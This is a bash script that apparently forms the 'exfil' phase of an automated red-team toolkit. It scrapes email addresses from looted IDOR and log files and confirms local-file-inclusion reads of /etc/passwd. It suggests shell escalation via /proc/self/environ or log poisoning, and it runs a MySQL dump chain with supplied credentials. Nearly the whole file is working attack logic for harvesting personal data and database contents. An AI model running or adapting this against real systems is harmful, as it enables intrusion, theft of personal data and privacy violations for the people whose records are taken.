#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../lib/checkpoint.sh"

parse_common_args "$@"
init_workspace
export WS TARGET MODE EGRESS DELAY FORCE

EXFIL_LOG="$WS/loot/EXFIL.log"
touch "$EXFIL_LOG"

if skip_if_checkpoint "loot/EXFIL.log" "exfil"; then mark_phase_done exfil; exit 0; fi

CK="$RTS_ROOT/checks"
URL="$(target_url)"

log "exfil phase — objective completion (only runs when vectors exist)"

PII_DONE=0
if compgen -G "$WS/loot/idor_*.html" >/dev/null 2>&1 || compgen -G "$WS/loot/log_*.txt" >/dev/null 2>&1; then
  log "PII aggregates"
  grep -rhoE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$WS/loot" 2>/dev/null | \
    sort -u > "$WS/loot/PII_emails_final.txt" || true
  n=$(wc -l < "$WS/loot/PII_emails_final.txt" 2>/dev/null || echo 0)
  echo "$(date -u +%FT%TZ) PII emails aggregated: $n" >> "$EXFIL_LOG"
  PII_DONE=1
fi

for lfi in "$WS"/exploit/lfi_*_passwd.txt; do
  if [[ -s "$lfi" ]] && grep -q "root:x:" "$lfi" 2>/dev/null; then
    log "LFI foothold present — suggest /bin/sh trampoline: ?<param>=/proc/self/environ with injected UA, or log-poison"
    echo "$(date -u +%FT%TZ) LFI read primitive confirmed: $lfi" >> "$EXFIL_LOG"
    if [[ "$MODE" == "ctf" ]]; then
      base=$(head -1 "$lfi" >/dev/null 2>&1; target_url)
      http_get "$base/index.php?page=/etc/passwd" >/dev/null 2>&1 || true
    fi
  fi
done

if [[ -n "${DB_HOST:-}" ]]; then
  bash "$CK/mysql_dump.sh" --target "$TARGET" --ws "$WS" --mode "$MODE" --egress "$EGRESS" --delay "$DELAY" \
    -- "$DB_HOST" "${DB_PORT:-3306}" "${DB_USER:-}" "${DB_PASS:-}" "${DBS:-}" || true
  echo "$(date -u +%FT%TZ) mysql chain attempted" >> "$EXFIL_LOG"
fi

if compgen -G "$WS/loot/dbdump/FULL-*.sql" >/dev/null 2>&1; then
  echo "$(date -u +%FT%TZ) SQL DUMP ACHIEVED: $(ls "$WS"/loot/dbdump/FULL-*.sql | wc -l) tables" >> "$EXFIL_LOG"
fi
if compgen -G "$WS/loot/idor_record_*.html" >/dev/null 2>&1; then
  echo "$(date -u +%FT%TZ) IDOR PII records: $(ls "$WS"/loot/idor_record_*.html | wc -l)" >> "$EXFIL_LOG"
fi

log "exfil phase done → see loot/"
mark_phase_done exfil
